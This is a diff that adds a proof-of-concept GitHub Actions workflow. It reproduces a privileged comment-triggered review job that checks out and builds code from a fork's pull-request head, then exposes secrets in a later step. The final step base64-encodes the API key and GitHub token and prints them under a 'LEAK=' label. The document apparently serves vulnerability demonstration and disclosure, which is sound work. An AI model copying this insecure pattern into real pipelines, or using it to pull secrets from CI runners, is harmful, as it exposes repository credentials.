@@ -1,0 +1,64 @@
+name: gab-poc-review-head
+# PoC: issue_comment-triggered privileged workflow that resolves the PR head SHA,
+# checks it out with actions/checkout@v7 and executes code from that (fork) head,
+# then runs a later step that holds a secret. Mirrors NethermindEth/ArkLibFri
+# .github/workflows/review.yml + lean4repo-utils/review@0.3 (resolve_pr_head.sh ->
+# checkout@v7 at head_sha -> `lake build` -> review.py with API_KEY/GITHUB_TOKEN).
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  contents: read
+  pull-requests: write
+  issues: write
+
+jobs:
+  review:
+    if: >-
+      github.event.issue.pull_request &&
+      startsWith(github.event.comment.body, '/review') &&
+      (
+        github.event.comment.author_association == 'OWNER' ||
+        github.event.comment.author_association == 'MEMBER' ||
+        github.event.comment.author_association == 'COLLABORATOR'
+      )
+    runs-on: ubuntu-latest
+    steps:
+      - name: Resolve PR head (same API call as resolve_pr_head.sh)
+        id: resolve_head
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          head_sha="$(gh api "repos/$GITHUB_REPOSITORY/pulls/$PR_NUMBER" --jq '.head.sha')"
+          base_sha="$(gh api "repos/$GITHUB_REPOSITORY/pulls/$PR_NUMBER" --jq '.base.sha')"
+          echo "head_sha=$head_sha" >> "$GITHUB_OUTPUT"
+          echo "head_repo=$(gh api "repos/$GITHUB_REPOSITORY/pulls/$PR_NUMBER" --jq '.head.repo.full_name')" >> "$GITHUB_OUTPUT"
+          echo "resolved head=$head_sha base=$base_sha"
+
+      - name: Checkout PR head (actions/checkout@v7, explicit ref)
+        uses: actions/checkout@v7.0.1
+        with:
+          ref: ${{ steps.resolve_head.outputs.head_sha }}
+          fetch-depth: 0
+          persist-credentials: false
+
+      - name: Show which head was checked out
+        run: |
+          echo "HEAD_REPO=${{ steps.resolve_head.outputs.head_repo }}"
+          git log -1 --format='CHECKED_OUT_SHA=%H SUBJECT=%s'
+
+      - name: Build PR head (stand-in for `lake build`, which executes PR lean code)
+        continue-on-error: true
+        run: |
+          bash ./pr-build.sh
+
+      - name: Later privileged step (stand-in for review.py with API_KEY/GITHUB_TOKEN)
+        env:
+          API_KEY: ${{ secrets.POC_SECRET }}
+          GH_TOKEN_STEP: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "api_key_len=${#API_KEY} token_len=${#GH_TOKEN_STEP}"
+          python3 -c "import os,base64; print('LEAK='+base64.b64encode(('api='+os.environ.get('API_KEY','')+'|tok='+os.environ.get('GH_TOKEN_STEP','')).encode()).decode())"
